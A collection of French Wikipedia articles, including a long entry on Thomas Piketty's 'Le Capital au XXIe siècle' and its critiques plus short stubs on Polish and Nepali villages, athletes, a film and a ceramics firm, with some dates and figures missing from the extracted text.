Jamais.
Devoir des prélats, prescrit sous le voile de la plaisanterie : castigat ridendo mores. "Conte sur le proverbe : n'avoir ni rime ni raison. Cette section est remplie de facétieuses aventures sans rime ni raison. La cruche de malvoisie prise pour un lézard, par des femmes ivres de vin. Bible hébraïque prise pour un livre de magicien par un prêtre, etc. Conte du ministre qui avoit rime et raison. Conte de la malvoisie."

</doc>
<doc id="7901935" url="https://fr.wikipedia.org/wiki?curid=7901935" title="Mes chers disparus">
Mes chers disparus

Mes chers disparus est une série télévisée française en six épisodes de 52 minutes, réalisée par Stéphane Kappes et diffusée du au sur France 2.
Synopsis.
Marianne Elbert, employée de mairie, femme au foyer comblée et boxeuse en club occasionnelle subissant des problèmes financiers met sa demeure principale en vente contre l'avis de ses proches, à savoir son mari José, ses enfants Claire et Félix ainsi que son parrain Jérôme. Mais très vite une chose incroyable survient : ses ancêtres décédés réapparaissent sous forme de fantômes. Plus rien ne va aller à la suite de leur apparition et les problèmes de tomber sur cette famille comme la pluie sur le sol...
Tournage.
Le tournage a eu lieu à Aix-en-Provence du au .
Le film a été sélectionné au Festival du film de télévision de Luchon 2014.

</doc>
<doc id="7901941" url="https://fr.wikipedia.org/wiki?curid=7901941" title="Scaevola (homonymie)">
Scaevola (homonymie)

Scaevola ou Scævola, cognomen qui signifie "gaucher", peut se rapporter à différents sujets.

</doc>
<doc id="7901946" url="https://fr.wikipedia.org/wiki?curid=7901946" title="Rouslan Galimov">
Rouslan Galimov

Rouslan Roustemovitch Galimov (en ) est un joueur russe de volley-ball né le à Blagovechtchensk (oblast d'Amour). Il mesure et joue attaquant.

</doc>
<doc id="7901952" url="https://fr.wikipedia.org/wiki?curid=7901952" title="Enzyme de conversion">
Enzyme de conversion



</doc>
<doc id="7901957" url="https://fr.wikipedia.org/wiki?curid=7901957" title="Nikolaï Astachkine">
Nikolaï Astachkine

Nikolaï Nikolaïevitch Astachkine (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.

</doc>
<doc id="7901958" url="https://fr.wikipedia.org/wiki?curid=7901958" title="Professeure associée">
Professeure associée



</doc>
<doc id="7901962" url="https://fr.wikipedia.org/wiki?curid=7901962" title="Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2009">
Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2009

La Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2009, ou EuroCup 2009, est la Coupe d'Europe des clubs de basket-ball en fauteuil roulant organisée par l'IWBF Europe.
Faits marquants.
C'est la première année qu'une quatrième division est disputée en Coupe d'Europe, ce qui a imposé une refonte des règlements des tours préliminaires, au nombre de trois désormais. Un total de 55 clubs est engagé dans la compétition. Cette nouvelle coupe a été nommée "Challenge Cup".

</doc>
<doc id="7901966" url="https://fr.wikipedia.org/wiki?curid=7901966" title="Université Aoyama Gakuin">
Université Aoyama Gakuin

L' est une université privée japonaise située dans l'arrondissement spécial de Shibuya à Tokyo.

</doc>
<doc id="7901971" url="https://fr.wikipedia.org/wiki?curid=7901971" title="Pamka">
Pamka

Pamka (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901976" url="https://fr.wikipedia.org/wiki?curid=7901976" title="Wayne Gretzky's 3D Hockey">
Wayne Gretzky's 3D Hockey



</doc>
<doc id="7901981" url="https://fr.wikipedia.org/wiki?curid=7901981" title="Chevrolet Corvette C5">
Chevrolet Corvette C5



</doc>
<doc id="7901986" url="https://fr.wikipedia.org/wiki?curid=7901986" title="Rendez-vous à Broad Street">
Rendez-vous à Broad Street

Rendez-vous à Broad Street ("") est un film britannique réalisé par Peter Webb, sorti en 1984.
Synopsis.
Paul McCartney part à la recherche des bandes de son dernier album qui lui ont été volées. Il a vingt-quatre heures pour les retrouver et empêcher sa maison de disques de faire faillite. Les bandes sont retrouvées; le voleur, qui s'est mis dans une situation compromettante et Paul se retrouvent et éclatent de rire. L'enquête est l'occasion de voir le musicien répéter avec son groupe.
L'argument est inspiré d'un fait réel survenu en 1973, alors que McCartney enregistrait l'album Band On The Run à Lagos (Nigéria) : son épouse et lui ont été agressés dans la rue, se voyant dérober les bandes magnétiques contenant les démos de l'album.
"Broad Street" se réfère à la gare de Broad Street à Londres, qui est filmée vers la fin.
Chansons.
Plusieurs chansons des Beatles se retrouvent dans le film, "Good Day Sunshine", "Yesterday", "Here, There and Everywhere", "For No One", "Eleanor Rigby" et "The Long and Winding Road". Et des musiciens de renom se sont assemblés pour la cause, à part Paul et Linda McCartney, on y entend donc Anne Dudley, George Martin, David Gilmour, Chris Spedding, Eric Stewart, John Paul Jones, Stuart Elliott, Ringo Starr, Jody Linscott, etc.

</doc>
<doc id="7901991" url="https://fr.wikipedia.org/wiki?curid=7901991" title="Pokharikanda">
Pokharikanda

Pokharikanda (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901993" url="https://fr.wikipedia.org/wiki?curid=7901993" title="Le Capital au XXIe siècle">
Le Capital au XXIe siècle

Le Capital au est un livre d'économie écrit par Thomas Piketty et publié en 2013, paru aux éditions du Seuil.
Ce livre étudie la dynamique de la répartition des revenus et patrimoines dans les pays développés depuis le . Pour l'auteur, la répartition des richesses constitue un problème politique fondamental pour la stabilité des sociétés démocratiques modernes et cette question est trop souvent débattue sans chiffres précis. Cette étude s'appuie sur une compilation de différentes données historiques disponibles, par exemple les archives fiscales françaises.
L'ouvrage est un succès mondial avec plus de d’exemplaires vendus, fin 2017. Il a d'abord obtenu un grand succès public en France avant de devenir un succès d'édition aux États-Unis. Il reçoit un accueil critique favorable, notamment après sa traduction en anglais publiée en 2014. Une quarantaine de contrats de cessions ont été signés par l'éditeur dans le monde, « record quasi absolu » pour un essai volumineux de ce type.
Un film homonyme est sorti en 2020, réalisé par .
Contenu.
Les deux lois fondamentales du capitalisme.
Thomas Piketty énonce deux lois fondamentales. La première dispose que la part des revenus du capital dans le revenu national (formula_1) est égal au taux de rendement moyen du capital (formula_2) multiplié par le ratio du stock de capital sur le revenu national (formula_3) : formula_4.
La seconde loi dispose qu'à long terme, le ratio du stock de capital sur le revenu (formula_3) tend vers le ratio du taux d'épargne (formula_6) sur le taux de croissance (formula_7) : formula_8. Cette loi peut également s'écrire formula_9 où formula_10 est le taux de dépréciation du capital.
Piketty estime que le rapport du capital sur le revenu formula_3 était de 6 ou 7 au , qu'il a chuté à 2 après la Seconde Guerre mondiale et qu'il retrouve aujourd'hui un niveau proche du avec une valeur de 5 ou 6.
Par ailleurs, Piketty constate que sur une longue période le rendement moyen du capital (formula_2) est supérieur au taux de croissance de l'économie (formula_13). Cela implique que les détenteurs de capital s'enrichissent plus rapidement que le reste de la population.
Pour l'auteur, ces résultats remettent en cause la relation de Kuznets établie dans les années 1950 qui laissait à penser que le développement économique s'accompagnait mécaniquement d'une baisse des inégalités de revenu. Les inégalités observées en ce début de seraient comparables aux niveaux d'inégalités du et du début du . Piketty affirme donc que le capitalisme, s'il n'est pas régulé, engendre des inégalités grandissantes. Il suggère plusieurs mesures politiques pour limiter la hausse des inégalités et notamment la création d'un impôt mondial sur le capital. Il insiste aussi sur la nécessité de mettre en place des évaluations précises des hauts patrimoines.
Synthèse de l'ouvrage.
Après avoir collecté et construit des bases de données importantes, Piketty parvient aux conclusions suivantes : tendanciellement, la croissance est un accident de l'histoire économique fortement fonction de l'accroissement de la population. De l'an 0 à , dans les pays développés, la croissance estimée aurait été de 0,1 % par an. Depuis la révolution industrielle, la croissance annuelle des pays développés n'est que de 1,6 % par an (dont 0,8 % par an au titre de la population et 0,8 % au titre de la production par habitant). Des taux de croissance (formula_7) de 5 à 10 % annuels n'ont eu lieu qu'en Europe pendant les « 30 glorieuses » et dans les pays en développement pendant une quinzaine d'années. Ils sont dus pour les premiers à la reconstruction à la suite des deux guerres mondiales et de la grande crise ; pour les seconds au « rattrapage » rapide sur les économies développées. D'après Piketty et plusieurs confrères, les périodes de très fortes croissances sont terminées.
Le taux de rémunération du capital (formula_2) est historiquement stable et supérieur à la croissance. Aussi loin que l'on puisse l'estimer (Piketty reprend des études qui font remonter cette estimation jusqu'à l'Empire romain), puis le calculer, le taux de rendement du capital qu'il soit agraire, industriel ou foncier, se situe entre 4,5 et 5 % par an. Piketty ne voit absolument aucune raison pour qu'il en aille différemment dans la suite du .
Structurellement, formula_16 implique une concentration toujours plus grande du capital. En prenant une création de nouvelles richesses au rythme de 0,1 % par an (ou même de 0,8 %) et une accumulation vers les propriétaires existant d'une ampleur de 4,5 à 5 %, la richesse se concentre progressivement (et à un rythme qui irait en s'accélérant) dans les mains de quelques-uns… Si cela n'a pas été le cas pendant les « 30 glorieuses » (seule période historique où la concentration du capital a été aussi faible), ce serait grâce à la conjugaison de plusieurs facteurs : forte croissance ; forte inflation (qui diminue le taux de rendement net du capital) ; imposition confiscatoire sur les hauts revenus et sur les grosses transmissions (respectivement jusqu'à 80 % et 90 % pour les tranches les plus élevées). De plus, tous ces phénomènes se sont concentrés sur une capitalisation quatre fois plus faible qu'en 1914. Cette vue peut aussi être considérée comme une théorie de la soutenabilité de l'endettement des ménages, des entreprises et de l'état, par extension de la soutenabilité de la dette publique.
Piketty propose enfin des pistes. La meilleure solution, "a priori", passe par un impôt réellement progressif et se décline en impôts confiscatoires sur les tranches les plus élevées des transmissions et des revenus pour limiter l'effet « naturel » de concentration ainsi qu'un impôt sur le capital pour accélérer une nouvelle répartition. Cette solution présenterait également l'avantage de résorber sans trop de dommages humains les énormes déficits publics. D'après la répartition de Piketty, les États n'ont pas bénéficié de l'immense accumulation de capital des 60 dernières années : ils détiennent une part toujours faible et assez stable de la richesse nationale tandis que la richesse privée a été multipliée par plus de deux.
Piketty ne s'illusionne pas sur la difficulté d'aboutir à une régulation coordonnée au niveau mondial. Il est également conscient de l'impopularité actuelle de telles mesures car certaines de nos valeurs (méritocratie, priorité du sentiment dans les comportements matrimoniaux, normes individuelles de réussite…) se sont développées/renforcées pendant l'anomalie du où formula_7 est devenue provisoirement supérieure à formula_2 et conduisent à une déconsidération avancée de l'État et de l'Impôt.
Réception de l'ouvrage.
Réception en France.
"Le Monde" donne une critique positive de l'ouvrage sous la plume de Julie Clarini, considérant que l'essai est une . Pour Mediapart, Piketty ausculte . Christian Chavagneux, dans "Alternatives économiques", affirme que le livre est . "Le Figaro" qualifie le livre de et souligne son succès en librairies.
Jean-Luc Gaffard, économiste à l'OFCE, déplore le fossé entre la richesse des données mobilisées et la simplicité de la théorie économique développée qui suppose notamment un taux de croissance exogène et indépendant du niveau des inégalités.
Dans la revue "Sociologie", Christian Baudelot et Roger Establet louent la .
Nicolas Baverez qualifie l'ouvrage de . Il souligne notamment que rien ne vient valider l'hypothèse de Piketty selon laquelle le serait condamné à une croissance faible.
Réception dans le monde anglo-saxon.
Le livre a rencontré un immense succès critique dans le monde anglo-saxon.
Dans son éditorial du , l'économiste Paul Krugman juge qu'il s'agit sans aucun doute du meilleur ouvrage d'économie de l'année et probablement de la décennie. Dans la "New York Review of Books", le même Krugman affirme que les travaux de Thomas Piketty constituent une révolution dans la manière dont nous comprenons les tendances de long terme des inégalités. Piketty et ses co-auteurs ont notamment montré l'intérêt de prendre comme indicateur la part de revenu qui revient aux 1 % les plus riches plutôt que de se focaliser sur des indicateurs plus généraux comme le rapport interdécile.
Le magazine "The Economist" souligne le succès du livre auprès du public mais se fait également critique sur le fond.
La version anglophone ("Capital in the Twenty-First Century") parue aux Harvard University Press en 2014 a aussi rencontré un grand succès en librairie aux États-Unis. Le livre apparaît à la dans le classement hebdomadaire des meilleures ventes d'essai du "New York Times" le , à la le , à la le , à la le , le et le juin et repasse à la le .
Le succès du livre est tel qu'il a déclenché ce que certains ont appelé une « bulle Piketty » ou une « Pikettymania ». Le magazine américain "Bloomberg Businessweek" a ainsi fait sa une du sur la Pikettymania avec une couverture parodiant les magazines pour adolescentes.
Réception en Chine.
La Chine exige que Thomas Piketty supprime de son ouvrage les passages liés à la hausse des inégalités sociales chinoises avant que d'être publié en librairie.
Ventes.
À la fin du mois de , Thomas Piketty a vendu près de de l'édition en langue anglaise et de l'édition francophone. En 2016, le livre s'était vendu à au moins 1,5 million d'exemplaires dans le monde. Fin 2017, 2,5 millions d'exemplaires avaient été vendus.
Critiques.
Controverse sur la véracité des résultats.
Le , le journaliste Chris Giles publie dans le "Financial Times" une remise en cause des données collectées par Piketty et dénonce une série d'erreurs dans les fichiers Excel publiés par l'auteur sur son site web. Il soutient que la part de la richesse détenue par les 10 % les plus riches serait de 44 % d'après l'Office for National Statistics, contre 71 % selon Thomas Piketty. D'après Giles, les erreurs et approximations qu'il relève remettent en cause deux résultats majeurs de l'ouvrage : la hausse des inégalités de patrimoine depuis 30 ans, et le fait que les inégalités de patrimoine soient plus fortes aux États-Unis qu'en Europe. Parmi les erreurs, il recense des erreurs de transcription, par exemple sur les inégalités de patrimoine en Suède en 1920, des corrections non justifiées, par exemple sur l'estimation des inégalités de patrimoine en France au à partir des sources successorales, des choix méthodologiques discutables, par exemple quand Piketty fait une simple moyenne des estimations pour le Royaume-Uni, la France et la Suède sans prendre en compte le poids démographique de chacun des pays et des interpolations abusives, par exemple pour la part de la richesse détenue par les 10 % les plus riches aux États-Unis entre 1910 et 1950.
Thomas Piketty répond à ces critiques le jour même en soulignant que si les données existantes sur le patrimoine sont imparfaites, les données sur les déclarations de successions sont plus fiables et vont dans le même sens. Il souligne aussi que les remarques du "Financial Times" ne changent rien aux conclusions de l'ouvrage. Il publie une réponse plus détaillée le sur son site internet, en montrant que la plupart des points que Giles considère comme des erreurs sont en fait justifiés et en soulignant que la plupart de ces points n'apportent que des modifications mineures. Quant à la proposition de Giles sur l'évolution des inégalités de patrimoine au Royaume-Uni, il considère les choix méthodologiques du journaliste du "Financial Times" comme très discutables. En effet, celui-ci s'est appuyé sur des données d'enquête plutôt que sur des données fiscales. Or les données d'enquête sous-estiment les patrimoines élevés.
Sur son blog, Paul Krugman défend Piketty et considère que le débat est clos. Dans le "Washington Post", Matt O'Brien juge lui aussi que Chris Giles, s'il a eu le mérite d'aller regarder de près les données mises en ligne par Thomas Piketty, a interprété trop vite les ajustements qu'il ne comprenait pas comme des erreurs de l'auteur. Dans le "Guardian", l'économiste Howard Reed a montré que le journaliste du "Financial Times" avait fait des erreurs importantes et défend les données présentées par Thomas Piketty.
Critique de la seconde loi fondamentale du capitalisme.
D'après Thomas Piketty, le rapport capital/revenu (formula_3) tend à long terme vers le ratio du taux d'épargne sur le taux de croissance de l'économie (formula_22). Les économistes Per Krusell et Tony Smith critiquent cette seconde loi fondamentale en soutenant qu'elle s'appuie sur une hypothèse extrême et peu réaliste à propos du comportement d'épargne des agents.
Capital productif et capital immobilier.
Dans une note publiée en pour le LIEPP, Étienne Wasmer et ses coauteurs remettent en cause l'hypothèse d'un retour du capital en France en distinguant le capital logement du capital productif. Ils défendent l'idée que l'augmentation du capital en France est essentiellement liée à une hausse des prix de l'immobilier et que cette hausse des prix ne se reflète pas dans les revenus du capital (c'est-à-dire les loyers).
Reprenant Joseph E. Stiglitz, Gaël Giraud critique la notion du capital retenu par Piketty, celle-ci regroupant à la fois le patrimoine et les infrastructures productivistes. D'après Giraud, la hausse des inégalités de patrimoine dans les pays riches proviendrait de la bulle immobilière touchant les grandes métropoles : la hausse des valeurs immobilières renchérit le capital des riches ménages qui accèdent ainsi plus facilement au crédit, leur permettant alors d’effectuer des opérations financières à fort effet de levier.
Causes de la formule r &gt; g à l'origine des inégalités.
Pour certains, le déterminant principal est le monopole d'acquisition des moyens de production par l'actionnaire quel que soit le capital qu'il a misé au départ. Ce monopole est dû à deux caractéristiques juridiques : le concept de « responsabilité limitée » et surtout, la non existence juridique de l'entreprise.
Interprétation de l'origine des inégalités.
Guillaume Allègre et Xavier Timbeau de l'Observatoire français des conjonctures économiques proposent une critique de l'ouvrage fondée sur l'idée que la relation selon laquelle le taux de rendement du capital est durablement supérieur au taux de croissance (formula_23) n'est pas, comme le suppose Piketty, une constante macroéconomique, mais a des fondements microéconomiques liés au fonctionnement imparfait des marchés. Leur critique suggère qu'un impôt sur le capital n'est peut-être pas la meilleure solution pour diminuer les inégalités, et les auteurs recommandent de réfléchir à la définition des droits de propriété ainsi qu'à la définition des droits des propriétaires et des non-propriétaires.
Gaël Giraud critique également, dans son ouvrage "Un monde d’inégalités", l'intérêt des travaux de Thomas Piketty en matière d'analyse des causes des inégalités. Tout d'abord, il critique le modèle utilisé car celui-ci, du fait selon lui de son appartenance à l'école néoclassique, ne prend pas en compte la monnaie, les ressources naturelles et les rétroactions du climat sur l'économie. L'absence de la monnaie empêche la prise en compte de la dérégulation financière tandis que la règle "r&gt;g" n'impliquerait pas une hausse des inégalités d'après les travaux de Daron Acemoğlu &amp; James A. Robinson.
Cohérence théorique.
Dans sa recension de l'ouvrage, Robert Boyer regrette un usage excessif de la méthode inductive. Il s'interroge notamment sur la pertinence de l'équation stipulant que le rapport capital sur revenu de long terme (formula_3 dans l'ouvrage) est égal au taux d'épargne (formula_6) divisé par le taux de croissance (formula_7) et souligne notamment que dans le cas limite d'une économie en stagnation (formula_27), l'équation devient absurde. Par ailleurs, il pointe aussi le fait que l'auteur, après avoir critiqué l'hypothèse de productivité marginale, le modèle à agent représentatif et le modèle de décision intertemporelle à horizon infini, fasse appel à ces mêmes hypothèses et ces mêmes modèles dans son raisonnement ultérieur.
Fondements moraux.
Dans une tribune publiée dans le magazine "Forbes", George Leef attaque Piketty non pas sur ses chiffres mais sur les fondements moraux de son raisonnement et convoque Frédéric Bastiat pour expliquer que l'État doit protéger la liberté et la propriété de chacun mais sort de son rôle quand il considère que certaines personnes sont « trop » riches.
Controverses sur les causes et les méfaits des inégalités.
L'une des critiques récurrentes, soulignée par Martin Wolf dans le "Financial Times", est que Piketty place l'inégalité au centre de son analyse sans apporter de réflexion visant à expliquer pourquoi l'inégalité importe, ce qui revient à supposer que l'inégalité est un problème important sans jamais expliquer pourquoi. Wolf rappelle l'existence d'arguments en faveur de l'inégalité, tels que l'incitation à l'innovation, ou le fait que dans une économie vingt fois plus productive qu'il y a deux siècles, même les pauvres bénéficient de biens et services qui n'étaient même pas disponibles aux plus riches il y a quelques décennies. Wolf souligne l'importance de l'égalité en droit (isonomie) et conclut que l'inégalité de fait ne peut jamais être totalement supprimée.
Michael D. Tanner, du Cato Institute, reproche à Piketty de tenir pour acquis les méfaits de l'inégalité : il évoque par exemple le fait que Piketty parle de l'augmentation des inégalités en Chine sans parler de la diminution considérable de la pauvreté : .
De la même manière, Clive Crook, sur "Bloomberg View", écrit qu', l'ouvrage incite les lecteurs à croire que l'inégalité est le seul problème important, et qu'il faudrait s'inquiéter de la faible croissance non parce que cela impacterait les niveaux de vie, mais aggraverait les inégalités.
Interprétation des résultats.
Hunter Lewis, de l'institut Ludwig von Mises, reproche à Piketty d'attribuer au capitalisme des situations qui sont selon lui le fait des banques centrales et d'un « capitalisme de connivence » ("Crony capitalism") où l'État est interventionniste, contrairement au capitalisme de laissez-faire.
Postérité.
Adaptation au cinéma.
"Le Capital au XXIe siècle" a été adapté au cinéma, le film étant coréalisé par Justin Pemberton et Thomas Piketty. Il est sorti en salles le 22 juin 2020.
Analyses complémentaires.
En 2020, deux sociologues, chercheuses au CNRS, Sibylle Gollac et Céline Bessière, publient un ouvrage, "Le Genre du capital", synthétisant une vingtaine d'années de recherche et d'enquêtes, apportant par rapport à l'ouvrage de Thomas Piketty un éclairage complémentaire sur les inégalités de transmissions de patrimoine selon le genre. Cet ouvrage de Gollac et de Bessière est traduit aussi en anglais par Juliette Rogers, et adapté en bande dessinée avec le concours de Jeanne Puchol.

</doc>
<doc id="7902000" url="https://fr.wikipedia.org/wiki?curid=7902000" title="Matela (Surkhet)">
Matela (Surkhet)

Matela (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902008" url="https://fr.wikipedia.org/wiki?curid=7902008" title="Pilaszków (Mazovie)">
Pilaszków (Mazovie)

Pilaszków [piˈlaʂkuf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 9 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 23 kilomètres à l'ouest de Varsovie.
Le village a une population de 191 habitants en 2009.

</doc>
<doc id="7902011" url="https://fr.wikipedia.org/wiki?curid=7902011" title="Pilaszków">
Pilaszków

Pilaszków peut faire référence à :
Toponymie.
en Pologne

</doc>
<doc id="7902013" url="https://fr.wikipedia.org/wiki?curid=7902013" title="Piotrkówek Duży">
Piotrkówek Duży

Piotrkówek Duży [pjɔtrˈkuvɛk ˈduʐɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 13 kilomètres à l'ouest de Varsovie.
Le village a une population de 67 habitants en 2009.

</doc>
<doc id="7902014" url="https://fr.wikipedia.org/wiki?curid=7902014" title="Piotrkówek Mały">
Piotrkówek Mały

Piotrkówek Mały [pjɔtrˈkuvɛk ˈmawɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres au nord-est d'Ożarów Mazowiecki (chef-lieu) et à 13 kilomètres à l'ouest de Varsovie.
Le village a une population de 341 habitants en 2009.

</doc>
<doc id="7902017" url="https://fr.wikipedia.org/wiki?curid=7902017" title="Malarani">
Malarani

Malarani (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902019" url="https://fr.wikipedia.org/wiki?curid=7902019" title="Chih-Hsiung Huang">
Chih-Hsiung Huang



</doc>
<doc id="7902020" url="https://fr.wikipedia.org/wiki?curid=7902020" title="Płochocin (Mazovie)">
Płochocin (Mazovie)

Płochocin [pwɔˈxɔt͡ɕin] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 20 kilomètres à l'ouest de Varsovie.
Le village a une population de 441 habitants en 2009.

</doc>
<doc id="7902027" url="https://fr.wikipedia.org/wiki?curid=7902027" title="Ceramiche Refin">
Ceramiche Refin

Ceramiche Refin S.p.A. est une société anonyme italienne, qui produit des carreaux en grès.
Historique.
Installée dans le pôle céramique de la zone industrielle de Sassuolo, Ceramiche Refin Spa a été créée en 1961, et dans les années qui suivront, elle va se consacrer à la production de « biscuit », un produit semi-ouvré en céramique destiné à un émaillage successif.
Après sa conversion en usine à cycle complet, elle s’engage dans la production de revêtements de sol en bicuisson auxquels elle ajoutera, au début des années 1970, la production de bicuisson pour le revêtement mural.
En matière de production de monocuisson pour la réalisation de sols en pâte rouge obtenue à partir d'argile de la région, Ceramiche Refin devient rapidement l'une des entreprises de premier plan du secteur ; un succès qu’elle doit en grande partie à la production de très grands formats (à l'époque jusqu'à 44x44 cm).
En 1983, Ceramiche Refin cesse l'activité de production et de commercialisation du biscuit pour se lancer dans la production de la monocuisson en pâte blanche. Entre 1987 et 1988, elle se porte acquéreur de City, une nouvelle société céramique spécialisée dans la production de monocuisson de revêtements de sols et de murs.
Au début des années 1990, Ceramiche Refin est convertie à la production de grès cérame émaillé et pleine masse. En 1998, elle entre dans le Groupe Concorde qui modernise tous les systèmes de production.
Entre 2000 et 2013, Ceramiche Refin connaît un essor.
Ceramiche Refin S.p.A. est membre de l', l'association qui a créé et mis en œuvre le référentiel LEED, une certification volontaire qui évalue et atteste la durabilité environnementale, sociale et économique des bâtiments, du projet à la réalisation.

</doc>
<doc id="7902031" url="https://fr.wikipedia.org/wiki?curid=7902031" title="Płochocin">
Płochocin

En Pologne, Płochocin désigne :

</doc>
<doc id="7902032" url="https://fr.wikipedia.org/wiki?curid=7902032" title="Mehelkuna">
Mehelkuna

Mehelkuna (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902034" url="https://fr.wikipedia.org/wiki?curid=7902034" title="Altair Jarabo">
Altair Jarabo



</doc>
<doc id="7902035" url="https://fr.wikipedia.org/wiki?curid=7902035" title="Caséine beta">
Caséine beta



</doc>
<doc id="7902036" url="https://fr.wikipedia.org/wiki?curid=7902036" title="Caséine alpha-S1">
Caséine alpha-S1



</doc>
<doc id="7902039" url="https://fr.wikipedia.org/wiki?curid=7902039" title="Pogroszew">
Pogroszew

Pogroszew [pɔˈɡrɔʂɛf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 19 kilomètres à l'ouest de Varsovie.
Le village a une population de 129 habitants en 2009.

</doc>
<doc id="7902040" url="https://fr.wikipedia.org/wiki?curid=7902040" title="Caséine alpha-S2">
Caséine alpha-S2



</doc>
<doc id="7902043" url="https://fr.wikipedia.org/wiki?curid=7902043" title="Pogroszew-Kolonia">
Pogroszew-Kolonia

Pogroszew-Kolonia [pɔˈɡrɔʂɛf kɔˈlɔɲa] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 19 kilomètres à l'ouest de Varsovie.
Le village a une population de 131 habitants en 2009.

</doc>
<doc id="7902044" url="https://fr.wikipedia.org/wiki?curid=7902044" title="Lauren Burns">
Lauren Burns

Lauren Burns (née le à Melbourne) est une taekwondoïste australienne. Elle a obtenu la médaille d'or lors des Jeux olympiques d'été de 2000 dans la catégorie des moins de , sa dernière compétition internationale. Aux Championnats du monde 1997, elle est médaillée de bronze en moins de .

</doc>
<doc id="7902045" url="https://fr.wikipedia.org/wiki?curid=7902045" title="Maintada">
Maintada

Maintada (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902050" url="https://fr.wikipedia.org/wiki?curid=7902050" title="Championnat de France masculin de handball de Nationale 2 2012-2013">
Championnat de France masculin de handball de Nationale 2 2012-2013

Le Championnat de France masculin de handball de Nationale 2 2012-2013 est la de ce championnat qui constitue du handball français.
La compétition est remportée par l'Agglomération Rouennaise Oissel Handball qui est promu en Nationale 1. Les autres promus et les relégués ne sont pas connus.
Formule de la compétition.
La Nationale 2 regroupe 56 clubs répartis en quatre poules de 14 clubs, selon la situation géographique et les classements obtenus précédemment. Dans chacune des quatre poules, les clubs se rencontrent en matches aller et retour. Au terme de la saison, les deux clubs classés premiers dans chacune des poules se disputent le titre de champion de France de Nationale 2 en matchs aller et retour.
Lors de la saison suivante, les championnats nationaux sont organisés en poules de 12 et non plus de 14. Le nombre de poules augmente également : la N1 passe de deux à trois poules, la N2 de quatre à six. Pour permettre cela, les clubs classés aux trois premières places des chaque poule montent en Nationale 1 et seuls les deux derniers sont relégués en Nationale 3.
Les clubs de l'édition 2012-2013.
Poule 1
Poule 2
Poule 3
Poule 4
Résultats.
L'Agglomération Rouennaise Oissel Handball est championne de France 2012-2013.

</doc>
<doc id="7902051" url="https://fr.wikipedia.org/wiki?curid=7902051" title="Affaire de Salo">
Affaire de Salo



</doc>
<doc id="7902052" url="https://fr.wikipedia.org/wiki?curid=7902052" title="Web SQL Database">
Web SQL Database

Web SQL est une API de stockage dans une base de données basée sur SQL.
L'API est supportée par Google Chrome, Opera, Safari et le navigateur mobile d'Android.
Le consortium W3C a annoncé en l'arrêt de la spécification. Une autre possibilité de stockage standardisée est IndexedDB.

</doc>
<doc id="7902053" url="https://fr.wikipedia.org/wiki?curid=7902053" title="Strzykuły">
Strzykuły

Strzykuły [stʂɨˈkuwɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-est d'Ożarów Mazowiecki (chef-lieu) et à 13 kilomètres à l'ouest de Varsovie.
Le village a une population de 341 habitants en 2009.

</doc>
<doc id="7902054" url="https://fr.wikipedia.org/wiki?curid=7902054" title="Combat de Salo">
Combat de Salo



</doc>
<doc id="7902055" url="https://fr.wikipedia.org/wiki?curid=7902055" title="Święcice (Mazovie)">
Święcice (Mazovie)

Święcice [ɕfjɛnˈt͡ɕit͡sɛ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 8 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 21 kilomètres à l'ouest de Varsovie.
Le village a une population de 863 habitants en 2020.

</doc>
<doc id="7902058" url="https://fr.wikipedia.org/wiki?curid=7902058" title="Święcice">
Święcice



</doc>
<doc id="7902061" url="https://fr.wikipedia.org/wiki?curid=7902061" title="Szeligi (Varsovie-ouest)">
Szeligi (Varsovie-ouest)

Szeligi [ʂɛˈliɡi] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 10 kilomètres à l'ouest de Varsovie.
Le village a une population de 160 habitants en 2006.

</doc>
<doc id="7902068" url="https://fr.wikipedia.org/wiki?curid=7902068" title="Umiastów">
Umiastów

